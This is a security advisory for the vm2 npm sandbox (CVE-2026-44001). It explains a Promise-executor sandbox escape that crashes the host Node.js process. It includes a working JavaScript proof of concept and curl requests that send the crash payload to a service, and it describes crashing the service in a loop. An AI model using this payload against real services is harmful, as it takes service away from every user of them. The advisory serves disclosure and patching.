# [H] vm2 has a Sandbox Escape via Promise Constructor Unhandled Rejection (Process Crash DoS)

## Summary
Severity: High
Advisory: GHSA-hw58-p9xv-2mjh
CVE: CVE-2026-44001
CWE: CWE-248
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:N/I:N/A:H (CVSS_V3)
Published: 2026-05-07
Source: https://github.com/advisories/GHSA-hw58-p9xv-2mjh
Type: github-advisory

## Affected
- npm: `vm2` — affected >=0 <3.11.0

## Details
### Summary
A sandbox escape vulnerability in vm2 v3.10.5 allows any sandboxed code to crash the host Node.js process via a single Promise constructor that triggers an unhandled rejection propagating to the host. The fix for CVE-2026-22709 (v3.10.2) only sanitized the `onRejected` callback in `.then()` and `.catch()` overrides and did not address the executor-to-unhandledRejection path.

### Details
When sandboxed code creates a `Promise` whose executor sets `Error.name` to a `Symbol()` and then accesses `.stack`, V8's internal `FormatStackTrace` (C++) attempts `Symbol.toString()`, which throws a **host-realm TypeError**. Because this error originates inside the Promise executor and no `.catch()` handler is attached, it becomes an **unhandled rejection** that propagates to the host process.

- `lib/setup-sandbox.js:38` — `localPromise` wraps the native `Promise` constructor but does not wrap the executor in try-catch.
- `lib/setup-sandbox.js:165-230` — `resetPromiseSpecies` and the `.then()`/`.catch()` overrides sanitize the `onRejected` callback chains, but do not intercept unhandled rejections originating from the executor itself.

The CVE-2026-22709 patch (v3.10.2) sanitized `.then()` and `.catch()` callback chains but left the executor-to-unhandledRejection path completely open.

**Root Cause**: Promise executor errors are not caught/sanitized before they can propagate as unhandled rejections to the host process, causing an immediate process crash.

**`allowAsync: false` does not help**: This setting only blocks `async`/`await` syntax and overrides `.then()`/`.catch()` to throw. The `Promise` constructor itself is still callable. Worse, because `.catch()` is blocked, any rejection from the executor is *guaranteed* to be unhandled — making `allowAsync: false` paradoxically more dangerous than `true` for this vulnerability.

### PoC

**Library-level PoC (Node.js script — primary):**
```javascript
const { VM } = require("vm2");

// Works with ANY allowAsync setting — both true and false
const vm = new VM({ timeout: 5000, allowAsync: false });

try {
  const result = vm.run(`
    new Promise(function(r, j) {
      var e = new Error();
      e.name = Symbol();
      e.stack;
    });
  `);
  console.log("Result:", result);   // Reaches here (returns Promise object)
} catch (err) {
  console.log("Caught:", err);       // Never executed
}

console.log("After try-catch");      // Also prints normally

// But on the next microtask tick:
// [UnhandledPromiseRejection: TypeError: Cannot convert a Symbol value to a string]
// Exit code: 1
//
// try-catch cannot help — vm.run() returns synchronously,
// the rejection fires asynchronously outside any catch scope.
//
// NOTE: allowAsync: false only blocks async/await syntax and
// .then()/.catch() method calls. The Promise constructor itself
// still executes, and the unhandled rejection still propagates.
// In fact, allowAsync: false makes it WORSE — .catch() is blocked,
// so the rejection is guaranteed to be unhandled.
```

**HTTP demonstration (web service impact):**
```bash
# 1. Confirm server is running
curl -s http://localhost:3000/api/execute \
  -X POST -H "Content-Type: application/json" \
  -d '{"code":"\"alive\""}'
# => {"output":[],"errors":[],"result":"\"alive\"","executionTime":1}

# 2. Send payload — server process will crash
curl -s -X POST http://localhost:3000/api/execute \
  -H "Content-Type: application/json" \
  -d '{"code":"new Promise(function(r,j){var e=new Error();e.name=Symbol();e.stack})"}'

# 3. Server is dead (connection refused until restart)
curl -s http://localhost:3000/  # => connection refused
```

### Impact
- **DoS**: A single request crashes the entire host Node.js process. All concurrent users lose service immediately. In Node.js 15+, unhandled rejections terminate the process by default — no special configuration is required for the crash to occur.
- **Persistent DoS despite restart policies**: Even when container orchestration (Docker restart policy, Kubernetes liveness probes, PM2, etc.) automatically restarts the crashed process, an attacker can send repeated requests to crash the process again before it fully recovers. In our testing, a single `curl` request caused the Docker container to restart (confirmed via `StartedAt` timestamp change), and sending the next request immediately after restart triggered another crash. This creates a **continuous denial-of-service loop** where the service never becomes available to legitimate users — each restart is met with another crash before any real request can be served.
- **Amplification**: A single HTTP request (~150 bytes) terminates the entire host process serving all users. The cost to the attacker is negligible compared to the impact.
- **Scope**: **All applications using vm2, regardless of `allowAsync` setting.** `allowAsync: false` only blocks `async`/`await` syntax and `.then()`/`.catch()` method calls — the `Promise` constructor itself still executes, and the unhandled rejection still propagates. In fact, `allowAsync: false` makes the vulnerability *worse* because `.catch()` is blocked, guaranteeing the rejection is always unhandled.

## References
- https://github.com/patriksimek/vm2/security/advisories/GHSA-hw58-p9xv-2mjh
- https://nvd.nist.gov/vuln/detail/CVE-2026-44001
- https://github.com/advisories/GHSA-99p7-6v5w-7xg8
- https://github.com/patriksimek/vm2
- https://github.com/patriksimek/vm2/releases/tag/v3.11.0
